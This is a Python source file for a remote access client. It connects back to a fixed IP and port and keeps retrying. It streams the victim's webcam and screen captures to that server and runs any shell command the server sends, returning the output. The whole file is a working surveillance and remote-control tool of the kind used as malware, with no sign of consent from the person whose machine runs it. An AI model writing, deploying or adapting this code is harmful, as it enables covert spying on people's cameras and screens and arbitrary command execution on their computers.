from threading import Thread
from PIL import ImageGrab

import subprocess
import socket
import psutil
import numpy
import time
import cv2

class Client:
    def __init__(self):
        self.client = None

        self.cam_thread = None
        self.screen_thread = None
        self.microphone_thread = None

        self.stream_cam_enabled = True
        self.close_thread = False

        self.connect_client()

    def connect_client(self):
        while True:
            print("Attempting to connect to server...")

            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.connect(("192.168.15.3", 4000))

                print("Connected to server")

                self.stream_cam_enabled = True
                self.close_thread = False

                self.cam_thread = Thread(target=self.get_cam_stream, args=(), daemon=True)
                self.screen_thread = Thread(target=self.get_screen, args=(), daemon=True)

                self.cam_thread.start()
                self.screen_thread.start()

                self.process_data()

            except Exception as err:
                print(err)

                self.client.close()

                time.sleep(5)
                continue
    
    def send_all(self, data):
        try:
            self.client.sendall(data)

        except:
            self.close_thread = True 
            return

    def receive_all(self):
        try:
            data = self.client.recv(1024)
            return data
            
        except:
            self.close_thread = True
            return

    def get_screen(self):
        current_process = psutil.Process()
        current_process.cpu_affinity([4])

        current_cores = current_process.cpu_affinity()

        while not self.close_thread:
            img = numpy.array(ImageGrab.grab())
            img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)

            _, encoded = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 80])

            frame_dump = encoded.tobytes()
            dump_len = len(frame_dump)

            len_frame = [(dump_len >> 16) & 0xff, (dump_len >> 8) & 0xff, dump_len & 0xff]

            self.send_all(bytes([0x03, *len_frame]) + frame_dump)

    def get_cam_stream(self):
        current_process = psutil.Process()
        current_process.cpu_affinity([3])

        current_cores = current_process.cpu_affinity()

        while not self.close_thread:
            try:
                cap = cv2.VideoCapture(0)
                while not self.close_thread:
                    ret, frame = cap.read()
                    if not ret or frame is None:
                        time.sleep(0.05)
                        continue

                    _, encoded = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                    frame_dump = encoded.tobytes()
                    dump_len = len(frame_dump)
                    len_frame = [(dump_len >> 16) & 0xff, (dump_len >> 8) & 0xff, dump_len & 0xff]

                    self.send_all(bytes([0x01, *len_frame]) + frame_dump)

                cap.release()

            except Exception as err:
                print("No camera detected")
                time.sleep(10)

    def command_process(self):
        while not self.close_thread:
            try:
                self.data = self.receive_all().decode()

                if self.data != "cmd_packet":
                    sys = subprocess.Popen(self.data, shell=True,stdout=subprocess.PIPE)
                    output = sys.stdout.read()
                    print(self.data)

                    len_msg = [len(output) >> 16 & 0xff, len(output) >> 8 & 0xff, len(output) & 0xff]

                    self.send_all(bytes([0x04, *len_msg, *output]))

                    break

            except Exception as err:
                print(err)

    def process_data(self):
        while not self.close_thread:
            try:
                data = self.receive_all().decode()
            except:
                continue

            if data == None:
                continue

            if data == "cmd_packet":
                self.command_process()

if __name__ == "__main__":
    Client()